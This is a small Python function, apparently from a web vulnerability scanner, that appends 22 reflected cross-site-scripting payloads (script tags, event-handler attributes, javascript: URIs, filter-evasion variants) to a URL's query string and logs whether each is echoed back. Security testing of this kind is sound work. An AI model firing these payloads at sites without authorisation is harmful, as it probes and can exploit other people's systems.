import requests

def check_xss(url, user_agent, create_log):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "';alert('XSS')//",
        "<img src=x onerror=alert('XSS')>",
        "<script>alert(1)</script>",
        "<script>confirm('XSS')</script>",
        "<script>prompt('XSS')</script>",
        "<img src=1 onerror='alert(1)'>",
        "<img src='javascript:alert(1)'>",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
        "javascript:alert('XSS')",
        "javascript:document.write('<script>alert(1)</script>')",
        "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "<style>@import'javascript:alert(1)';</style>",
        "<div onmouseover=alert('XSS')>hover me</div>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<<script>alert(1);//<</script>",
        "<script>alert(1)</script>"
    ]
    try:
        headers = {'User-Agent': user_agent}
        for payload in xss_payloads:
            test_url = f"{url}?test={payload}"
            response = requests.get(test_url, headers=headers)
            if payload in response.text:
                create_log(f"\n[!] XSS vulnerability detected at {test_url}","red")
            else:
                create_log(f"\n[-] XSS vulnerability not detected at {test_url}","green4")
    except requests.exceptions.RequestException as e:
        create_log(f"[!]An error occurred while checking XSS: {e}")

# Example usage in the main scanning function
if __name__ == "__main__":
    def create_log(message, color=None):
        print(message)

    starting_url = "http://example.com"  # Replace with the starting URL
    user_agent = "Mozilla/5.0"

    # Call your functions here
    check_xss(starting_url, user_agent, create_log)
